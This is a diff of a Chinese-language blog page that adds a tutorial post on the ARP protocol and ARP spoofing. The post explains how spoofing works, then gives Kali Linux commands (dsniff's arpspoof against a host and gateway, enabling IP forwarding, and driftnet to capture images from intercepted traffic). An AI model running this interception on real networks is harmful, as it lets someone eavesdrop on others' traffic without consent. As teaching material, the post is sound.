@@ -162,7 +162,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/07/07/README/">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/07/08/RIP%E5%8D%8F%E8%AE%AE%E5%92%8C%E6%A8%A1%E6%8B%9F%E6%94%BB%E5%87%BB/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.png">
@@ -176,7 +176,106 @@
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
           
-            <a href="/2022/07/07/README/" class="post-title-link" itemprop="url">Hello World</a>
+            <a href="/2022/07/08/RIP%E5%8D%8F%E8%AE%AE%E5%92%8C%E6%A8%A1%E6%8B%9F%E6%94%BB%E5%87%BB/" class="post-title-link" itemprop="url">ARP协议及模拟攻击</a>
+        </h2>
+
+        <div class="post-meta">
+	
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2022-07-08 20:17:02 / 修改时间：22:02:46" itemprop="dateCreated datePublished" datetime="2022-07-08T20:17:02+08:00">2022-07-08</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%9F%BA%E4%BA%8E%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E6%94%BB%E5%87%BB/" itemprop="url" rel="index"><span itemprop="name">-基于网络协议攻击</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="ARP（地址解析协议）"><a href="#ARP（地址解析协议）" class="headerlink" title="ARP（地址解析协议）"></a>ARP（地址解析协议）</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><blockquote>
+<p>主机发送信息时将包含目标IP地址的ARP请求广播到局域网络上的所有主机，并接收返回消息，以此确定目标的物理地址；收到返回消息后将该IP地址和物理地址存入本机ARP缓存中并保留一定时间，下次请求时直接查询ARP缓存以节约资源。</p>
+</blockquote>
+<h2 id="ARP协议类型"><a href="#ARP协议类型" class="headerlink" title="ARP协议类型"></a>ARP协议类型</h2><h4 id="ARP请求报文"><a href="#ARP请求报文" class="headerlink" title="ARP请求报文"></a>ARP请求报文</h4><p><img src="https://s2.loli.net/2022/07/08/h8ZbDWdCivXm6gz.png" alt="ARP请求.png"></p>
+<p>主机1想与主机2交流，首先通过广播发送包含目标IP的ARP请求报文。</p>
+<h4 id="ARP应答报文"><a href="#ARP应答报文" class="headerlink" title="ARP应答报文"></a>ARP应答报文</h4><p><img src="https://s2.loli.net/2022/07/08/qfItGYdM9yz7o2u.png" alt="ARP应答.png"></p>
+<p>主机2接受到报文之后确定身份，并且以单播形式回复，并且包含自己的IP和MAC地址。</p>
+<h2 id="ARP欺骗"><a href="#ARP欺骗" class="headerlink" title="ARP欺骗"></a>ARP欺骗</h2><blockquote>
+<p>地址解析协议是建立在网络中各个主机互相信任的基础上的，局域网络上的主机可以自主发送ARP应答消息，其他主机收到应答报文时不会检测该报文的真实性就会将其记入本机ARP缓存；由此攻击者就可以向某一主机发送伪ARP应答报文，使其发送的信息无法到达预期的主机或到达错误的主机，这就构成了一个ARP欺骗。</p>
+</blockquote>
+<p><img src="https://s2.loli.net/2022/07/08/qJQkxG1C2ZouVT8.png" alt="ARP欺骗.png"></p>
+<h2 id="Kali-Linux-实现ARP欺骗"><a href="#Kali-Linux-实现ARP欺骗" class="headerlink" title="Kali Linux 实现ARP欺骗"></a>Kali Linux 实现ARP欺骗</h2><p>Kali安装工具</p>
+<figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install dsniff</span><br></pre></td></tr></table></figure>
+
+<p>安装dsniff(里面包含多个工具)</p>
+<figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arpspoof -i eth0 -t <span class="number">192.168</span><span class="number">.1</span><span class="number">.1</span> <span class="number">192.168</span><span class="number">.1</span><span class="number">.254</span></span><br></pre></td></tr></table></figure>
+
+<p>-i 表示本机网络端口、-t 表示目标网络</p>
+<p>不停的向主机(192.168.1.1)和网关(192.168.1.254)发送ARP应答，使攻击者的MAC地址存入主机中的ARP缓存中，此后主机发送给网关的数据都将发送给攻击者，从而达到流量监控。同时攻击者需要打开IP转发功能，使被攻击主机能够上网。</p>
+<figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo <span class="number">1</span> &gt;&gt; /<span class="keyword">proc</span>/sys/net/ipv4/ip_forward</span><br></pre></td></tr></table></figure>
+
+<p>向该目录下的ip_forward文件中写入1（添加），用来启动IP转发功能。</p>
+<p>Kali中有个工具可以抓取被监听者流量中的图片</p>
+<figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install driftnet </span><br></pre></td></tr></table></figure>
+
+<p>下载工具</p>
+<figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">driftnet -i eth0</span><br></pre></td></tr></table></figure>
+
+<p>-i 表示本机端口(抓取流量的端口)</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/07/07/First%20test/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="朝歌">
+      <meta itemprop="description" content="道可道，非常道。">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="CHacker">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/07/07/First%20test/" class="post-title-link" itemprop="url">Hello World</a>
         </h2>
 
         <div class="post-meta">
@@ -371,9 +470,21 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">2</span>
+          <span class="site-state-item-count">3</span>
           <span class="site-state-item-name">日志</span>
         </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">1</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">1</span>
+        <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
 </div>
@@ -421,7 +532,7 @@
 
 <div class="theme-info">
   <div class="powered-by"></div>
-  <span class="post-count">博客全站共112字</span>
+  <span class="post-count">博客全站共651字</span>
 </div>
 
 
